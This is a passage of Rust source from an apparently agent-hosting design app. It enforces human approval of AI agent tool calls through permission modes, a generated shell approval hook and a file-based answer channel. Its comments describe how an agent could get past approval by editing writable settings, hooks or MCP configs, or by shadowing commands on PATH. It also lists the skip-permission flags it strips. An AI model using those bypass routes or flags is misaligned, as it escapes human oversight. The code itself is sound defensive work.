//! Agent permission modes (`Skip` vs `Ask`), session hook generators, the file-backed approval bridge (requests and
//! answers in the Studio-private folder of [`crate::agent_approval_channel`]), and unfocused-window OS notifications (`#656`).

use crate::comments::settings;
use crate::terminal::{AgentCliPreset, PermissionMode};
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

pub const SETTING_KEY: &str = "agent_permission_mode";
pub const APPROVAL_HOOK_TIMEOUT_SECS: u64 = 300;
pub const MAX_INPUT_SUMMARY_CHARS: usize = 200;

/// Global agent permission mode persisted in `<library>/settings.json` under `"agent_permission_mode"`.
pub type AgentPermissionMode = PermissionMode;

impl PermissionMode {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Skip => "skip",
            Self::Ask => "ask",
            Self::AskRisky => "ask_risky",
        }
    }

    /// Skip only for exactly `"skip"`. Ask for risky only only for exactly `"ask_risky"`.
    /// Anything else, including `""`, is Ask (fail closed, `#841`).
    pub fn parse(raw: &str) -> Self {
        let raw = raw.trim();
        if raw.eq_ignore_ascii_case("skip") {
            Self::Skip
        } else if raw.eq_ignore_ascii_case("ask_risky") {
            Self::AskRisky
        } else {
            Self::Ask
        }
    }

    pub fn installs_approval_hook(self) -> bool {
        self != Self::Skip
    }

    pub fn auto_allows_safe_tiers(self) -> bool {
        self == Self::AskRisky
    }
}

/// Modes the user picked whose save to `settings.json` failed (read-only library, full disk), per library root.
/// The picked mode keeps applying in this process: reading the older value still on disk would silently turn
/// Ask back into Skip at the next agent start. A later successful save of that root clears its entry.
static UNSAVED_MODES: Mutex<BTreeMap<PathBuf, AgentPermissionMode>> = Mutex::new(BTreeMap::new());

fn unsaved_modes() -> std::sync::MutexGuard<'static, BTreeMap<PathBuf, AgentPermissionMode>> {
    UNSAVED_MODES.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
}

/// Reads `"agent_permission_mode"` from `<root>/settings.json`. A missing, unknown or unreadable value is
/// [`AgentPermissionMode::Ask`] (fail closed, `#841`).
pub fn load_permission_mode(root: &Path) -> AgentPermissionMode {
    load_saved_permission_mode(root).unwrap_or_default()
}

/// The mode in force for `<root>`: the one whose save failed, else the one saved in `<root>/settings.json`, or
/// `None` when neither exists. Unlike [`load_permission_mode`] it does not invent a default, so a caller can keep
/// its in-memory mode.
pub fn load_saved_permission_mode(root: &Path) -> Option<AgentPermissionMode> {
    if let Some(mode) = unsaved_modes().get(root) {
        return Some(*mode);
    }
    settings::load_choice(root, SETTING_KEY).map(|s| AgentPermissionMode::parse(&s))
}

/// Persists `"agent_permission_mode"` (`"skip"`, `"ask"`, or `"ask_risky"`) to `<root>/settings.json`. A failed save is
/// remembered for this process (see [`UNSAVED_MODES`]) so the chosen mode still applies; the error is returned.
pub fn save_permission_mode(root: &Path, mode: AgentPermissionMode) -> Result<(), String> {
    let saved = settings::save_choice(root, SETTING_KEY, mode.as_str());
    match &saved {
        Ok(()) => {
            unsaved_modes().remove(root);
        }
        Err(_) => {
            unsaved_modes().insert(root.to_path_buf(), mode);
        }
    }
    saved
}

/// Strips the auto-approve / skip-permissions flag from a CLI command string when in `Ask` mode.
pub fn strip_skip_permission_flags(cmd: &str) -> String {
    cmd.replace(" --dangerously-skip-permissions", "")
        .replace(" --dangerously-bypass-approvals-and-sandbox", "")
        .replace(" --always-approve", "")
        .replace(" --approval-mode yolo", " --approval-mode default")
}

/// How a Skip-mode Claude launch names its MCP config and its hooks: the files Studio writes into the session folder.
pub const SKIP_CLAUDE_CONFIG_ARGS: &str = "--mcp-config \"$DESIGNOS_MCP_CONFIG\" --settings \"$DESIGNOS_SESSION_DIR/hooks.json\"";

/// How an Ask-mode Claude launch names its MCP config, its hooks, its setting sources and its skill. Claude's working
/// folder is the session folder, which an agent can write, and Claude loads (and live-reloads) `<cwd>/.claude/settings.json`,
/// `<cwd>/.claude/settings.local.json` and `<cwd>/.mcp.json` from it: allow rules, hooks and MCP servers. `--setting-sources
/// user` stops Claude loading any of the three, while `--mcp-config`, `--settings` and `--plugin-dir` still apply. It also
/// drops the project skill folder, so Studio's skill comes as a plugin from the private folder. Claude starts the servers of
/// the `--mcp-config` file as commands, so that file is a private copy too, not `<session>/mcp-config.json`. The values are
/// [`CLAUDE_MCP_CONFIG_ENV`], [`CLAUDE_SETTINGS_ENV`] and [`CLAUDE_PLUGIN_ENV`], which Studio sets for the tab and never
/// leaves empty.
pub const ASK_CLAUDE_CONFIG_ARGS: &str =
    "--mcp-config \"$DESIGNOS_CLAUDE_MCP_CONFIG\" --settings \"$DESIGNOS_CLAUDE_SETTINGS\" --setting-sources user --plugin-dir \"$DESIGNOS_CLAUDE_PLUGIN\"";

/// Environment variable of an Ask-mode tab that holds the value of Claude's `--mcp-config` (see [`claude_mcp_config_value`]).
pub const CLAUDE_MCP_CONFIG_ENV: &str = "DESIGNOS_CLAUDE_MCP_CONFIG";

/// `--mcp-config` value that starts no server: inline JSON, so no file and nothing to rewrite. What an Ask tab gets when
/// there is no private MCP config to give it (it then has no `designos` tools, which is the fail-closed side).
pub const NO_CLAUDE_MCP_CONFIG: &str = r#"{"mcpServers":{}}"#;

/// Environment variable of an Ask-mode tab that holds the value of Claude's `--settings` (see [`claude_settings_value`]).
pub const CLAUDE_SETTINGS_ENV: &str = "DESIGNOS_CLAUDE_SETTINGS";

/// Environment variable of an Ask-mode tab that holds the value of Claude's `--plugin-dir` (see [`claude_plugin_value`]).
pub const CLAUDE_PLUGIN_ENV: &str = "DESIGNOS_CLAUDE_PLUGIN";

/// `--plugin-dir` value that names no plugin: an absolute path nothing exists at. Claude logs "Plugin path does not exist"
/// and goes on. An empty value would be read as the working folder, and a folder that exists is loaded as a plugin or as a
/// folder of plugins, so this is what a tab gets when there is no private plugin to give it. On Unix only root can create
/// it. On Windows it resolves under `C:\`, where a user can by default; a write there is outside what the agents Studio
/// starts can do (their write grants are the working folder and the temp folders), so it stays outside the threat model.
pub const NO_CLAUDE_PLUGIN_DIR: &str = "/nonexistent/designos-claude-plugin-unavailable";

/// `--settings` value that names no settings: inline JSON, so no file and nothing to reload.
pub const NO_CLAUDE_SETTINGS: &str = "{}";

/// The launch command of an agent started in `Ask` mode, from the `Skip` one: [`strip_skip_permission_flags`], and Claude's
/// MCP config, hooks, setting sources and skill are the ones of [`ASK_CLAUDE_CONFIG_ARGS`] instead of the session folder's
/// (see [`claude_mcp_config_value`], [`claude_settings_value`] and [`claude_plugin_value`]).
pub fn ask_mode_launch_command(skip_cmd: &str) -> String {
    let ask_cmd = strip_skip_permission_flags(skip_cmd).replace(SKIP_CLAUDE_CONFIG_ARGS, ASK_CLAUDE_CONFIG_ARGS);
    // The swap above is a text replace: a Skip launch that spelt `--settings` or `--mcp-config` another way would pass through
    // it unchanged.
    debug_assert!(!ask_cmd.contains("$DESIGNOS_SESSION_DIR/hooks.json"), "an Ask launch names a hooks file in the session folder: {ask_cmd}");
    debug_assert!(
        !ask_cmd.contains("--mcp-config \"$DESIGNOS_MCP_CONFIG\"") && !ask_cmd.contains("--mcp-config $DESIGNOS_MCP_CONFIG"),
        "an Ask launch names the MCP config in the session folder: {ask_cmd}"
    );
    ask_cmd
}

/// The value of Claude's `--mcp-config` for a tab started in `mode`, set as [`CLAUDE_MCP_CONFIG_ENV`]; `None` in Skip mode,
/// whose launch names `<session>/mcp-config.json` itself.
///
/// Claude starts the servers of that file as commands, outside any sandbox, so in Ask mode it is the private copy Studio
/// writes next to the hooks, once it exists. Without it (no private folder, or it could not be written) the value is
/// [`NO_CLAUDE_MCP_CONFIG`]: Claude starts no server, so it has no `designos` tools, rather than start one from a file an
/// agent can write.
pub fn claude_mcp_config_value(session_dir: &Path, mode: AgentPermissionMode) -> Option<String> {
    match mode {
        AgentPermissionMode::Skip => None,
        AgentPermissionMode::Ask | AgentPermissionMode::AskRisky => Some(
            crate::agent_approval_channel::mcp_config_path(session_dir)
                .filter(|path| path.is_file())
                .map_or_else(|| NO_CLAUDE_MCP_CONFIG.to_string(), |path| path.display().to_string()),
        ),
    }
}

/// The value of Claude's `--settings` for a tab started in `mode`, set as [`CLAUDE_SETTINGS_ENV`]; `None` in Skip mode,
/// whose launch names `<session>/hooks.json` itself.
///
/// In Ask mode it is the hooks file in the session's private folder once Studio has written it there. The hooks name
/// the approval handler, so a file an agent can write must never be the one Claude reads: its docs say edits to hooks in
/// settings files are normally picked up as they happen, and nothing says a `--settings` file is the exception. Without
/// that file (no private folder, or it could not be written) the value is the inline settings `{}`: Claude starts with
/// none of Studio's hooks, asks in its own terminal prompt, and reads nothing the agent can write.
pub fn claude_settings_value(session_dir: &Path, mode: AgentPermissionMode) -> Option<String> {
    match mode {
        AgentPermissionMode::Skip => None,
        AgentPermissionMode::Ask | AgentPermissionMode::AskRisky => Some(
            crate::agent_approval_channel::hooks_file_path(session_dir)
                .filter(|path| path.is_file())
                .map_or_else(|| NO_CLAUDE_SETTINGS.to_string(), |path| path.display().to_string()),
        ),
    }
}

/// Where Studio's session skill sits inside the private plugin folder, relative to it.
pub const CLAUDE_PLUGIN_SKILL_PATH: &str = "skills/designos-studio/SKILL.md";

/// The manifest of the private plugin, relative to it. A folder without it is read as a folder of plugins, and every
/// child of such a folder is loaded.
pub const CLAUDE_PLUGIN_MANIFEST_PATH: &str = ".claude-plugin/plugin.json";

/// The value of Claude's `--plugin-dir` for a tab started in `mode`, set as [`CLAUDE_PLUGIN_ENV`]; `None` in Skip mode.
///
/// In Ask mode it is the session's private plugin folder, once it holds its manifest and Studio's skill. Otherwise it is
/// [`NO_CLAUDE_PLUGIN_DIR`]. It is never empty, and never the channel folder or any folder an agent can write.
pub fn claude_plugin_value(session_dir: &Path, mode: AgentPermissionMode) -> Option<String> {
    match mode {
        AgentPermissionMode::Skip => None,
        AgentPermissionMode::Ask | AgentPermissionMode::AskRisky => Some(
            crate::agent_approval_channel::claude_plugin_dir_path(session_dir)
                .filter(|dir| dir.join(CLAUDE_PLUGIN_MANIFEST_PATH).is_file() && dir.join(CLAUDE_PLUGIN_SKILL_PATH).is_file())
                .map_or_else(|| NO_CLAUDE_PLUGIN_DIR.to_string(), |dir| dir.display().to_string()),
        ),
    }
}

/// Writes Studio's session skill into `<plugin_dir>` as a Claude plugin (owner-only files in owner-only folders), for an
/// Ask-mode Claude that loads no project skills. The plugin is named so that it cannot be mistaken for a user's own.
pub fn write_claude_plugin(plugin_dir: &Path, skill_md: &[u8]) -> std::io::Result<()> {
    let manifest = serde_json::json!({
        "name": "designos-studio-session",
        "description": "DESIGN:OS Studio's skill for the file this session is bound to",
        "version": env!("CARGO_PKG_VERSION"),
    });
    let manifest_path = plugin_dir.join(CLAUDE_PLUGIN_MANIFEST_PATH);
    let skill_path = plugin_dir.join(CLAUDE_PLUGIN_SKILL_PATH);
    for file in [&manifest_path, &skill_path] {
        if let Some(parent) = file.parent() {
            crate::agent_approval_channel::create_private_dir_all(parent)?;
        }
    }
    let manifest_bytes = serde_json::to_vec_pretty(&manifest).map_err(std::io::Error::other)?;
    crate::agent_approval_channel::write_owner_only_file(&manifest_path, &manifest_bytes, false)?;
    crate::agent_approval_channel::write_owner_only_file(&skill_path, skill_md, false)
}

/// The file Studio wrote Claude's hooks to for the agents `st` starts in its current mode (tests read it back).
#[cfg(test)]
pub fn claude_hooks_path(st: &crate::terminal::TerminalState) -> PathBuf {
    match st.permission_mode {
        AgentPermissionMode::Skip => st.session_dir.join("hooks.json"),
        AgentPermissionMode::Ask | AgentPermissionMode::AskRisky => {
            crate::agent_approval_channel::hooks_file_path(&st.session_dir).expect("a private channel folder")
        }
    }
}

/// Removes `<session_dir>/hooks.json` when it still names the approval hook. An earlier build wrote it there in Ask mode; nothing
/// reads it any more, and a file in a folder an agent can write must not carry an approval handler. A hooks file without
/// one (written in Skip mode, grants nothing) is left alone: a Skip-mode tab still running may be reading it.
pub fn remove_stale_session_hooks(session_dir: &Path) {
    let path = session_dir.join("hooks.json");
    let names_approval_hook = crate::agent_session_files::read_session_file(&path)
        .is_ok_and(|bytes| String::from_utf8_lossy(&bytes).contains(crate::agent_approval_channel::HOOK_SCRIPT_NAME));
    if names_approval_hook {
        let _ = crate::agent_session_files::remove_session_file(&path);
    }
}

/// Mode-aware wrapper around [`crate::agent_sessions::build_new_session_command`].
pub fn build_new_session_command_for_mode(preset: AgentCliPreset, mode: AgentPermissionMode, session_uuid: Option<&str>) -> String {
    let base = crate::agent_sessions::build_new_session_command(preset, session_uuid);
    match mode {
        AgentPermissionMode::Skip => base,
        AgentPermissionMode::Ask | AgentPermissionMode::AskRisky => ask_mode_launch_command(&base),
    }
}

/// Mode-aware wrapper around [`crate::agent_sessions::build_resume_command_scoped`].
pub fn build_resume_command_for_mode(
    entry: &crate::agent_sessions::SessionEntry,
    codex_cwd_scoped: bool,
    agy_cwd_scoped: bool,
    mode: AgentPermissionMode,
) -> Option<String> {
    let base = crate::agent_sessions::build_resume_command_scoped(entry, codex_cwd_scoped, agy_cwd_scoped)?;
    Some(match mode {
        AgentPermissionMode::Skip => base,
        AgentPermissionMode::Ask | AgentPermissionMode::AskRisky => ask_mode_launch_command(&base),
    })
}

/// Generates the POSIX `sh` script Studio installs in the session's private channel folder
/// ([`crate::agent_approval_channel`]) for Claude Code's `PermissionRequest` hook in `Ask` and `Ask for risky only`.
///
/// The folder it answers from and the file it reports status to (`status_file`, in the hook folder of `agent_hook_outputs`; none
/// when no hook has a folder) are written into the script itself.
/// The environment may only name the tab (digits, checked) and shorten the wait; it never names a path, so a
/// variable an agent managed to set cannot point the hook at a folder the agent can write. Request ids are 128 bits
/// from `/dev/urandom`.
///
/// `auto_allow_safe_tiers` lets read and additive designos tools exit allow before a request file exists.
/// The name list is generated from [`designos_mcp::risk::names_where_tier`]. The block runs only after the tab id and
/// the request id have been checked, and only when the payload names exactly one `tool_name`. It is present only when
/// the channel folder's name is the session id and the private log can be prepared. A failed append does not allow.
pub fn approval_hook_script(channel_dir: &Path, status_file: Option<&Path>, auto_allow_safe_tiers: bool) -> String {
    let quote = |p: &Path| p.display().to_string().replace('\'', "'\\''");
    let channel_dir_escaped = quote(channel_dir);
    let status_assignment = status_file.map(|file| format!("STATUS_FILE='{}'\n", quote(file))).unwrap_or_default();
    let status_write = if status_file.is_some() { "{ printf '{\"state\":\"waiting\"}\\n' > \"$STATUS_FILE\"; } 2>/dev/null || true\n" } else { "" };
    // The system's commands go first on `PATH`, so a command of the same name in an earlier entry never decides anything
    // here. The rest of the inherited `PATH` stays after them: a system without `od` or `awk` in those folders (NixOS) still
    // finds them. The script Studio writes on Windows (Git Bash) leaves `PATH` alone: Git Bash already leads it with its own
    // `/usr/bin`, and no CI run of this change could have checked the pin against that shell.
    let path_pin = if cfg!(windows) { "" } else { "PATH=\"/usr/bin:/bin${PATH:+:$PATH}\"\nexport PATH\n" };
    let auto_block = if auto_allow_safe_tiers {
        prepare_channel_auto_allow_log(channel_dir).as_deref().map(shell_auto_allow_block).unwrap_or_default()
    } else {
        String::new()
    };
    let script = format!(
        r#"#!/bin/sh
set -eu
umask 077
{path_pin}
CHANNEL_DIR='{channel_dir_escaped}'
{status_assignment}
# Declining prints nothing, so Claude asks in its own terminal prompt. Drain stdin first so Claude's write to this
# hook never meets a closed pipe.
decline() {{
    cat > /dev/null 2>&1 || true
    exit 0
}}

case "${{DESIGNOS_TAB_ID:-}}" in
    ''|*[!0-9]*) decline ;;
esac
APPROVALS_DIR="$CHANNEL_DIR/tab-$DESIGNOS_TAB_ID"
mkdir -p "$APPROVALS_DIR" || decline
{status_write}REQ_ID="$(od -An -N16 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n' || true)"
case "$REQ_ID" in
    ''|*[!0-9a-f]*) decline ;;
esac
[ "${{#REQ_ID}}" -eq 32 ] || decline
# Stdin is still intact: decline() is the only earlier reader, and it already exited. The auto-allow check runs
# before any request file exists, and only for a payload that names exactly one tool.
PAYLOAD=$(cat || true)
@@AUTO_ALLOW@@

REQ_TMP="$APPROVALS_DIR/$REQ_ID.request.tmp"
REQ_FILE="$APPROVALS_DIR/$REQ_ID.request.json"
ANS_FILE="$APPROVALS_DIR/$REQ_ID.answer"
NOW_TS="$(date +%s)"

printf '%s\n' "$PAYLOAD" | awk -v req_id="$REQ_ID" -v ts="$NOW_TS" '
function extract_json_str(text, key,    pat, rest, i, c, nxt, out) {{
    pat = "\"" key "\"[[:space:]]*:[[:space:]]*\""
    if (!match(text, pat)) return ""
    rest = substr(text, RSTART + RLENGTH)
    out = ""
    i = 1
    while (i <= length(rest)) {{
        c = substr(rest, i, 1)
        if (c == "\\") {{
            if (i + 1 <= length(rest)) {{
                nxt = substr(rest, i + 1, 1)
                if (nxt == "\"" || nxt == "\\" || nxt == "/") {{
                    out = out nxt
                }} else if (nxt == "n" || nxt == "r" || nxt == "t") {{
                    out = out " "
                }} else {{
                    out = out nxt
                }}
                i += 2
                continue
            }} else {{
                break
            }}
        }} else if (c == "\"") {{
            break
        }} else {{
            out = out c
            i += 1
        }}
    }}
    return out
}}
function extract_scalar(text, key,    s, pat, rest) {{
    s = extract_json_str(text, key)
    if (length(s) > 0) return s
    pat = "\"" key "\"[[:space:]]*:[[:space:]]*"
    if (!match(text, pat)) return ""
    rest = substr(text, RSTART + RLENGTH)
    if (match(rest, /^-?[0-9]+([.][0-9]+)?/)) return substr(rest, RSTART, RLENGTH)
    return ""
}}
function first_target(text,    keys, i, n, v) {{
    n = split("node_id page_id parent_id thread_id comment_id file_path path output_path", keys, " ")
    for (i = 1; i <= n; i++) {{
        v = extract_scalar(text, keys[i])
        if (length(v) > 0) return keys[i] ":" v
    }}
    return ""
}}
function json_escape(s,    i, c, out) {{
    out = ""
    for (i = 1; i <= length(s); i++) {{
        c = substr(s, i, 1)
        if (c == "\\") out = out "\\\\"
        else if (c == "\"") out = out "\\\""
        else out = out c
    }}
    return out
}}
{{
    buf = buf " " $0
}}
END {{
    gsub(/[\r\n\t]+/, " ", buf)
    tool = extract_json_str(buf, "tool_name")
    if (length(tool) == 0) tool = "tool"
    summary = extract_json_str(buf, "command")
    if (length(summary) == 0) summary = extract_json_str(buf, "file_path")
    if (length(summary) == 0) summary = extract_json_str(buf, "path")
    if (length(summary) == 0) summary = extract_json_str(buf, "pattern")
    gsub(/[\r\n\t]+/, " ", summary)
    sub(/^[[:space:]]+/, "", summary)
    sub(/[[:space:]]+$/, "", summary)
    if (length(summary) == 0) {{
        summary = tool
    }}
    target = first_target(buf)
    printf "{{\"id\":\"%s\",\"tool_name\":\"%s\",\"input_summary\":\"%s\",\"target\":\"%s\",\"timestamp\":%s}}\n", req_id, json_escape(tool), json_escape(summary), json_escape(target), ts
}}
' > "$REQ_TMP"

mv -f "$REQ_TMP" "$REQ_FILE"

TIMEOUT_MS="${{DESIGNOS_APPROVAL_TIMEOUT_MS:-300000}}"
case "$TIMEOUT_MS" in
    ''|*[!0-9]*) TIMEOUT_MS=300000 ;;
esac
ELAPSED_MS=0
while [ "$ELAPSED_MS" -lt "$TIMEOUT_MS" ]; do
    if [ -f "$ANS_FILE" ]; then
        RAW=$(tr '\n' ' ' < "$ANS_FILE" 2>/dev/null || true)
        RAW=$(printf '%s' "$RAW" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        rm -f "$REQ_FILE" "$ANS_FILE"
        DECISION=""
        SCOPE=""
        case "$RAW" in
            "{{"*)
                DECISION=$(printf '%s' "$RAW" | sed -n 's/.*"decision"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -n 1)
                if printf '%s' "$RAW" | grep -q '"scope"'; then
                    SCOPE=$(printf '%s' "$RAW" | sed -n 's/.*"scope"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -n 1)
                    case "$SCOPE" in
                        once|session) ;;
                        *) exit 0 ;;
                    esac
                else
                    SCOPE=once
                fi
                ;;
            *)
                DECISION=$(printf '%s\n' "$RAW" | awk '{{print $1}}')
                SCOPE=$(printf '%s\n' "$RAW" | awk '{{if (NF>=2) print $2; else print "once"}}')
                ;;
        esac
        case "$SCOPE" in
            once|session) ;;
            *) exit 0 ;;
        esac
        case "$DECISION" in
            allow)
                printf '{{"hookSpecificOutput":{{"hookEventName":"PermissionRequest","decision":{{"behavior":"allow"}}}}}}\n'
                exit 0
                ;;
            deny)
                printf '{{"hookSpecificOutput":{{"hookEventName":"PermissionRequest","decision":{{"behavior":"deny","message":"Denied in design:os studio"}}}}}}\n'
                exit 0
                ;;
            *)
                exit 0
                ;;
        esac
    fi
    # Studio removes the request when its tab closes or the request goes stale: nothing was approved.
    [ -f "$REQ_FILE" ] || exit 0
    sleep 0.1
    ELAPSED_MS=$((ELAPSED_MS + 100))
done

exit 0
"#
    );
    script.replacen("@@AUTO_ALLOW@@", &auto_block, 1)
}

const AUTO_ALLOW_TARGET_AWK: &str = r#"function pick(text, key,    pat, rest, i, c, out) {
    pat = "\"" key "\"[[:space:]]*:[[:space:]]*"
    if (!match(text, pat)) return ""
    rest = substr(text, RSTART + RLENGTH)
    if (substr(rest, 1, 1) == "\"") {
        rest = substr(rest, 2)
        out = ""
        i = 1
        while (i <= length(rest)) {
            c = substr(rest, i, 1)
            if (c == "\\") {
                if (i + 1 <= length(rest)) out = out substr(rest, i + 1, 1)
                i += 2
                continue
            }
            if (c == "\"") break
            out = out c
            i++
        }
        return out
    }
    if (match(rest, /^-?[0-9]+([.][0-9]+)?/)) return substr(rest, RSTART, RLENGTH)
    return ""
}
{ buf = buf $0 }
END {
    n = split("node_id page_id parent_id thread_id comment_id file_path path output_path", keys, " ")
    for (i = 1; i <= n; i++) {
        v = pick(buf, keys[i])
        if (length(v) > 0 && length(v) <= 512) {
            gsub(/\\/, "\\\\", v)
            gsub(/"/, "\\\"", v)
            gsub(/[\r\n\t]/, " ", v)
            printf "%s:%s", keys[i], v
            exit
        }
    }
}"#;

fn shell_auto_allow_block(log_path: &Path) -> String {
    let mut names = Vec::new();
    for name in designos_mcp::risk::names_where_tier(|tier| matches!(tier, designos_mcp::risk::RiskTier::Read | designos_mcp::risk::RiskTier::Additive)) {
        for spelled in [name.to_string(), format!("mcp__designos__{name}"), format!("designos__{name}"), format!("designos:{name}")] {
            if !names.iter().any(|existing| existing == &spelled) {
                names.push(spelled);
            }
        }
    }
    let pattern = names.join("|");
    let escaped = log_path.display().to_string().replace('\'', "'\\''");
    format!(
        r#"# Auto-allow only when the payload names exactly one tool. A second "tool_name" key (for example inside
# tool_input) is ambiguous, so the call falls through to the card.
TOOL_NAME_KEYS=$(printf '%s' "$PAYLOAD" | grep -o '"tool_name"[[:space:]]*:[[:space:]]*"[^"]*"' || true)
TOOL_FOR_TIER=""
if [ -n "$TOOL_NAME_KEYS" ] && [ "$(printf '%s\n' "$TOOL_NAME_KEYS" | wc -l)" -eq 1 ]; then
    TOOL_FOR_TIER=$(printf '%s' "$TOOL_NAME_KEYS" | sed 's/.*:[[:space:]]*"\([^"]*\)"$/\1/')
fi
case "$TOOL_FOR_TIER" in
{pattern})
    TS=$(date +%s 2>/dev/null || printf '0')
    case "$TS" in
        ''|*[!0-9]*) TS=0 ;;
    esac
    TARGET=$(printf '%s' "$PAYLOAD" | awk '{awk}')
    TAB_FIELD=""
    case "$(basename "$APPROVALS_DIR")" in
        tab-[0-9]*)
            TAB_ID=$(basename "$APPROVALS_DIR" | sed 's/^tab-//')
            case "$TAB_ID" in
                *[!0-9]*) ;;
                *) TAB_FIELD=",\"tab\":$TAB_ID" ;;
            esac
            ;;
    esac
    if printf '%s\n' "{{\"ts\":$TS,\"tool\":\"$TOOL_FOR_TIER\",\"target\":\"$TARGET\",\"reason\":\"tier\"$TAB_FIELD}}" >> '{escaped}'
    then
        printf '%s\n' '{{"hookSpecificOutput":{{"hookEventName":"PermissionRequest","decision":{{"behavior":"allow"}}}}}}'
        exit 0
    fi
    ;;
esac
"#,
        pattern = pattern,
        awk = AUTO_ALLOW_TARGET_AWK,
        escaped = escaped,
    )
}

/// Installs `approve-hook.sh` in `session_dir`'s private channel folder ([`crate::agent_approval_channel`]) and returns
/// its path. Fails, leaving the hook uninstalled, when the platform has no private data folder or the folder cannot be
/// made private; Claude then asks in its own terminal prompt. This is the Ask-mode script, which asks for every call.
pub fn write_approval_hook_script(session_dir: &Path) -> std::io::Result<PathBuf> {
    let channel_dir = crate::agent_approval_channel::prepare_channel_dir(session_dir)?;
    install_hook_script(&channel_dir, Some(&crate::agent_hook_outputs::HookPaths::locate(session_dir).status()), false)
}

/// Writes `<channel_dir>/approve-hook.sh` (owner-only on Unix), which reports its status to `status_file` (none: it reports none).
/// `auto_allow_safe_tiers` is set for `Ask for risky only` and left off for `Ask`.
pub(crate) fn install_hook_script(channel_dir: &Path, status_file: Option<&Path>, auto_allow_safe_tiers: bool) -> std::io::Result<PathBuf> {
    let script_path = channel_dir.join(crate::agent_approval_channel::HOOK_SCRIPT_NAME);
    let content = approval_hook_script(channel_dir, status_file, auto_allow_safe_tiers);
    crate::agent_approval_channel::write_owner_only_file(&script_path, content.as_bytes(), true)?;
    Ok(script_path)
}

/// Handler appended to Claude's `PermissionRequest` hook group in `Ask` mode: runs `approve-hook.sh`, which blocks up
/// to `APPROVAL_HOOK_TIMEOUT_SECS` for the answer given in the in-panel approval card, and never sets
/// `permissions.allow` (`#656`). It runs next to the status handler of that group, so the turn status
/// (`agent-events.jsonl`) still sees the request.
///
/// On Unix the interpreter is `/bin/sh` by path: it is looked up on Claude's `PATH` before the script can pin anything,
/// so a `sh` earlier on that `PATH` would otherwise be the one that runs the script. Windows (Git Bash) keeps `sh`.
pub fn approval_hook_handler(script_path: &Path) -> serde_json::Value {
    let s = script_path.display().to_string().replace('\'', "'\\''");
    let interpreter = if cfg!(windows) { "sh" } else { "/bin/sh" };
    serde_json::json!({
        "type": "command",
        "command": format!("{interpreter} '{s}'"),
        "timeout": APPROVAL_HOOK_TIMEOUT_SECS,
    })
}

/// One pending tool-approval request in `<tab approvals folder>/<id>.request.json`.
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct ApprovalRequest {
    pub id: String,
    pub tool_name: String,
    #[serde(alias = "summary")]
    pub input_summary: String,
    pub timestamp: u64,
    /// `node_id:2` or `path:/file`. Empty when the hook could not find a stable target.
    #[serde(default)]
    pub target: String,
}

/// Decision written by Studio to `<tab approvals folder>/<id>.answer`.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ApprovalDecision {
    Allow,
    Deny,
    Withdrawn,
}

impl ApprovalDecision {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Deny => "deny",
            Self::Withdrawn => "withdrawn",
        }
    }
}

/// Summarizes a `PermissionRequest`'s `tool_input` to at most [`MAX_INPUT_SUMMARY_CHARS`] characters,
/// never including file bodies (`content`, `new_string`, `old_string`).
pub fn summarize_tool_input(tool_name: &str, tool_input: &serde_json::Value) -> String {
    let raw = tool_input
        .get("command")
        .or_else(|| tool_input.get("file_path"))
        .or_else(|| tool_input.get("path"))
        .or_else(|| tool_input.get("pattern"))
        .and_then(|v| v.as_str())
        .unwrap_or(tool_name);
    let cleaned: String = raw.chars().map(|c| if c.is_control() { ' ' } else { c }).collect();
    let trimmed = cleaned.trim();
    let fallback = if trimmed.is_empty() { tool_name } else { trimmed };
    fallback.chars().take(MAX_INPUT_SUMMARY_CHARS).collect()
}

/// A request id names the `<id>.answer` file Studio writes, so it must be a plain file stem: the hook makes 32 hex
/// digits, and nothing else (a `/`, a `..`, an empty or very long name) is ever answered.
fn is_valid_request_id(id: &str) -> bool {
    !id.is_empty() && id.len() <= 64 && id.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
}

/// Polls `<approvals_dir>/*.request.json`, cleaning up any stale request files older than
/// `timeout_secs` and returning active requests ordered oldest-first.
pub fn poll_approvals_in_dir(approvals_dir: &Path, now_secs: u64, timeout_secs: u64) -> Vec<ApprovalRequest> {
    let Ok(entries) = std::fs::read_dir(approvals_dir) else {
        return Vec::new();
    };
    let mut requests = Vec::new();
    for entry in entries.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        if !name.ends_with(".request.json") {
            continue;
        }
        let Ok(bytes) = std::fs::read(&path) else {
            continue;
        };
        let raw = String::from_utf8_lossy(&bytes);
        let Ok(mut req) = serde_json::from_str::<ApprovalRequest>(&raw) else {
            continue;
        };
        if !is_valid_request_id(&req.id) {
            continue;
        }
        let ans = approvals_dir.join(format!("{}.answer", req.id));
        if req.timestamp > 0 && now_secs.saturating_sub(req.timestamp) > timeout_secs {
            let _ = std::fs::remove_file(&path);
            let _ = std::fs::remove_file(&ans);
            continue;
        }
        if ans.exists() {
            continue;
        }
        if req.input_summary.chars().count() > MAX_INPUT_SUMMARY_CHARS {
            req.input_summary = req.input_summary.chars().take(MAX_INPUT_SUMMARY_CHARS).collect();
        }
        req.target = canonical_target(&req.target);
        requests.push(req);
    }
    requests.sort_by(|a, b| (a.timestamp, &a.id).cmp(&(b.timestamp, &b.id)));
    requests
}

/// Writes `<approvals_dir>/<id>.answer` (`allow`, `deny`, or `withdrawn`). A missing scope means once.
/// `id` must be a request id as [`poll_approvals_in_dir`] returns it; any other name is refused.
pub fn write_approval_answer_in_dir(approvals_dir: &Path, id: &str, decision: ApprovalDecision) -> std::io::Result<()> {
    write_scoped_approval_answer_in_dir(approvals_dir, id, decision, AnswerScope::Once)
}

/// Writes `<approvals_dir>/<id>.answer` with an optional scope. `allow` alone is once. `allow session` remembers nothing by itself.
pub fn write_scoped_approval_answer_in_dir(approvals_dir: &Path, id: &str, decision: ApprovalDecision, scope: AnswerScope) -> std::io::Result<()> {
    if !is_valid_request_id(id) {
